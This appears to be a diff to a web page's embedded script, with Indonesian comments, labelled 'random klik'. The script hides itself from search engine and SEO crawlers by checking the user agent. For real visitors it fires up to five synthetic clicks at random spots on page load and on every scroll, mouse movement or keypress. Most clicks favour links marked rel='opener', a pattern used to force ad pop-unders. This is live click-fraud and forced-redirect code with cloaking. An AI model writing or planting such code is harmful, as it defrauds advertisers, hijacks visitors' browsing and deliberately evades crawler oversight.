@@ -1,22 +1,23 @@
 
-
-
-
 <!-- random klik start -->
 <script>
 (function() {
   'use strict';
 
-  if (/bot|crawler|spider|google|bing|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot/i.test(navigator.userAgent)) return;
+  // ========== ABAAIKAN BOT/CRAWLER ==========
+  const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
+  if (botPattern.test(navigator.userAgent)) return;
 
+  // ========== KONFIGURASI ==========
   const MAX_KLIK = 5;
-  const DELAY_MIN = 300;
-  const DELAY_MAX = 1000;
+  const DELAY_MIN = 300;   // 0.3 detik
+  const DELAY_MAX = 1000;  // 1 detik
+  const OPENER_CHANCE = 0.8; // 80% chance klik link opener
 
   let klikCount = 0;
   let timeoutId = null;
-  let isRunning = false;
 
+  // ========== DETEKSI ELEMEN ==========
   function isOpenerLink(el) {
     if (!el) return false;
     if (el.tagName.toLowerCase() !== 'a') return false;
@@ -24,26 +25,41 @@
     return rel.includes('opener');
   }
 
+  function isVisible(el) {
+    if (!el) return false;
+    const rect = el.getBoundingClientRect();
+    return rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth;
+  }
+
   function isSafeElement(el) {
     if (!el) return false;
+    // Boleh klik link opener
     if (isOpenerLink(el)) return true;
+    // Hindari elemen interaktif
     const tag = el.tagName.toLowerCase();
-    const role = el.getAttribute('role');
-    const unsafe = ['button', 'input', 'select', 'textarea', 'form', 'label', 'iframe', 'video', 'audio', 'canvas'];
-    if (unsafe.includes(tag)) return false;
-    if (role && ['button', 'checkbox', 'radio', 'switch', 'tab', 'menuitem'].includes(role)) return false;
-    if (el.closest('button, input, select, textarea, form, [role="button"], [role="checkbox"], [role="radio"], [onclick]:not(a[rel*="opener"])')) return false;
+    const role = (el.getAttribute('role') || '').toLowerCase();
+    const blockedTags = ['button', 'input', 'select', 'textarea', 'form', 'label', 'iframe', 'video', 'audio', 'canvas', 'embed', 'object'];
+    const blockedRoles = ['button', 'link', 'checkbox', 'radio', 'switch', 'tab', 'menuitem', 'textbox', 'searchbox', 'slider', 'spinbutton'];
+    if (blockedTags.includes(tag)) return false;
+    if (blockedRoles.includes(role)) return false;
+    if (el.closest('button, input, select, textarea, form, iframe, video, [role="button"], [role="link"], [role="textbox"], [onclick]:not(a[rel*="opener"])')) return false;
+    // Link non-opener juga jangan
     if (tag === 'a' && !isOpenerLink(el)) return false;
     return true;
   }
 
+  // ========== FUNGSI UTAMA ==========
   function randomDelay() {
     return DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN);
   }
 
+  function getOpenerLinks() {
+    return Array.from(document.querySelectorAll('a[rel~="opener"]')).filter(isVisible);
+  }
+
   function doClick() {
     if (klikCount >= MAX_KLIK) {
-      stopAll();
+      stopLoop();
       return;
     }
 
@@ -52,72 +68,78 @@
       let x, y;
       let openerClicked = false;
 
-      const openerLinks = Array.from(document.querySelectorAll('a[rel~="opener"]')).filter(a => {
-        const rect = a.getBoundingClientRect();
-        return rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth;
-      });
+      const openerLinks = getOpenerLinks();
 
-      if (openerLinks.length > 0 && Math.random() < 0.7) {
+      // Prioritaskan link opener
+      if (openerLinks.length > 0 && Math.random() < OPENER_CHANCE) {
         const link = openerLinks[Math.floor(Math.random() * openerLinks.length)];
         const rect = link.getBoundingClientRect();
-        x = rect.left + rect.width / 2;
-        y = rect.top + rect.height / 2;
-        el = document.elementFromPoint(x, y);
+        x = rect.left + Math.random() * rect.width;
+        y = rect.top + Math.random() * rect.height;
+        el = document.elementFromPoint(x, y) || link;
         openerClicked = true;
       } else {
-        for (let i = 0; i < 10; i++) {
+        // Cari area aman
+        for (let i = 0; i < 20; i++) {
           x = Math.random() * window.innerWidth;
           y = Math.random() * window.innerHeight;
           el = document.elementFromPoint(x, y);
           if (isSafeElement(el)) break;
+          el = null;
+        }
+        // Fallback: kalau tidak ketemu, klik body saja
+        if (!el || !isSafeElement(el)) {
+          el = document.body;
+          x = window.innerWidth / 2;
+          y = window.innerHeight / 2;
         }
       }
 
-      if (el && isSafeElement(el)) {
+      if (el) {
         el.dispatchEvent(new MouseEvent('click', {
           bubbles: true,
           cancelable: true,
           clientX: x,
-          clientY: y
+          clientY: y,
+          view: window
         }));
       }
 
       klikCount++;
 
+      // Kalau klik opener, stop setelah ini
       if (openerClicked) {
-        stopAll();
+        stopLoop();
         return;
       }
 
-      if (klikCount < MAX_KLIK) {
-        timeoutId = setTimeout(doClick, randomDelay());
-      } else {
-        stopAll();
-      }
     } catch (e) {
       klikCount++;
-      if (klikCount < MAX_KLIK) {
-        timeoutId = setTimeout(doClick, randomDelay());
-      }
+    }
+
+    // Lanjut atau berhenti
+    if (klikCount < MAX_KLIK) {
+      timeoutId = setTimeout(doClick, randomDelay());
+    } else {
+      stopLoop();
     }
   }
 
+  // ========== START / STOP ==========
   function startLoop() {
-    // Reset setiap kali dipicu
     klikCount = 0;
     if (timeoutId) clearTimeout(timeoutId);
-    isRunning = true;
     doClick();
   }
 
-  function stopAll() {
-    isRunning = false;
+  function stopLoop() {
     if (timeoutId) {
       clearTimeout(timeoutId);
       timeoutId = null;
     }
   }
 
+  // ========== EVENT LISTENERS ==========
   const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
 
   interactionEvents.forEach(eventType => {
@@ -125,21 +147,23 @@
     window.addEventListener(eventType, startLoop, { capture: true, passive: true });
   });
 
+  // Jalan otomatis setelah halaman siap
   if (document.readyState === 'interactive' || document.readyState === 'complete') {
     startLoop();
   } else {
     document.addEventListener('DOMContentLoaded', startLoop, { once: true });
   }
 
+  // Stop saat pergi
   ['pagehide', 'beforeunload', 'popstate'].forEach(eventType => {
-    window.addEventListener(eventType, () => stopAll(), { passive: true });
+    window.addEventListener(eventType, () => stopLoop(), { passive: true });
   });
 
   document.addEventListener('visibilitychange', () => {
-    if (document.hidden) stopAll();
+    if (document.hidden) stopLoop();
   });
 
-  window.addEventListener('unload', stopAll);
+  window.addEventListener('unload', stopLoop);
 
 })();
 </script>
